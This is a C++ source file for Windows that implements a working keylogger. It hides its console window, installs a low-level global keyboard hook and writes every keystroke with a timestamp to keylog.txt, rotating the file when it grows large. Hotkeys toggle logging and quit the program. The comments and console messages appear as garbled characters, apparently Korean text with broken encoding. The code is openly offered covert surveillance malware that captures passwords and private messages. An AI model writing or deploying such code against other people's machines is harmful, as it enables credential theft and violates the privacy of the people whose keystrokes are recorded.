#include <windows.h>
#include <fstream>
#include <iostream>
#include <ctime>
#include <string>
#include <codecvt>
#include <locale>
#include "pch.h"

#define STR "keylog.txt"
#define LG std::ofstream

HHOOK hHook;
bool isLoggingEnabled = true;
const size_t MAX_FILE_SIZE = 1024 * 1024;

// std::wstring�� std::string���� ��ȯ�ϴ� �Լ�
std::string wstringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
    return converter.to_bytes(wstr);
}

// ���� �ð� ������ ���ڿ��� ��ȯ�Ͽ� ��ȯ
std::string GetTimestamp() {
    std::time_t now = std::time(nullptr);
    std::tm localTime;
    localtime_s(&localTime, &now);  // localtime_s�� �����Ͽ� ������ �����ϰ� ���

    char buffer[80];
    strftime(buffer, sizeof(buffer), "[%Y-%m-%d %H:%M:%S] ", &localTime);
    return buffer;
}

// ���� Ű �ڵ带 ���ڿ��� ��ȯ�ϴ� �Լ�
std::string GetKeyName(DWORD vkCode) {
    BYTE keyboardState[256];
    WCHAR buffer[5];

    if (GetKeyboardState(keyboardState)) {
        HKL layout = GetKeyboardLayout(0);
        int result = ToUnicodeEx(vkCode, MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout),
            keyboardState, buffer, 5, 0, layout);

        if (result > 0) {
            return wstringToString(std::wstring(buffer, result));
        }
    }

    switch (vkCode) {
    case VK_RETURN: return "[Enter]";
    case VK_BACK: return "[Backspace]";
    case VK_TAB: return "[Tab]";
    case VK_SHIFT: return "[Shift]";
    case VK_CONTROL: return "[Ctrl]";
    case VK_MENU: return "[Alt]";
    case VK_CAPITAL: return "[Caps Lock]";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return " ";
    default:
        return "[Unknown Key]";
    }
}

// �α� ���� ũ�� Ȯ�� �� ���� ����
void CheckLogFileSize() {
    std::ifstream file(STR, std::ios::binary | std::ios::ate);
    if (file.is_open() && file.tellg() >= MAX_FILE_SIZE) {
        file.close();

        std::time_t now = std::time(nullptr);
        std::tm localTime;
        localtime_s(&localTime, &now);  // localtime_s�� ����
        char buffer[80];
        strftime(buffer, sizeof(buffer), "keylog_%Y%m%d_%H%M%S.txt", &localTime);
        rename(STR, buffer);
    }
}

// �� ���ν��� (Ű �Է��� ����ä�� ���Ͽ� ���)
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && isLoggingEnabled) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            CheckLogFileSize();
            LG log(STR, std::ios::app);
            if (log.is_open()) {
                log << GetTimestamp() << GetKeyName(pKeyboard->vkCode) << std::endl;
                log.close();
            }
        }
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 &&
        GetAsyncKeyState(VK_SHIFT) & 0x8000 &&
        GetAsyncKeyState(0x51) & 0x8000) {
        PostQuitMessage(0);
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 &&
        GetAsyncKeyState(VK_SHIFT) & 0x8000 &&
        GetAsyncKeyState(0x4C) & 0x8000) {
        isLoggingEnabled = !isLoggingEnabled;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        std::cerr << "��ŷ ��ġ�� �����߽��ϴ�." << std::endl;
        return 1;
    }
    std::cout << "��ŷ�� ���۵Ǿ����ϴ�. 'keylog.txt' ���Ͽ� ��ϵ˴ϴ�." << std::endl;
    std::cout << "�����Ϸ��� Ctrl+Shift+Q�� ��������." << std::endl;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}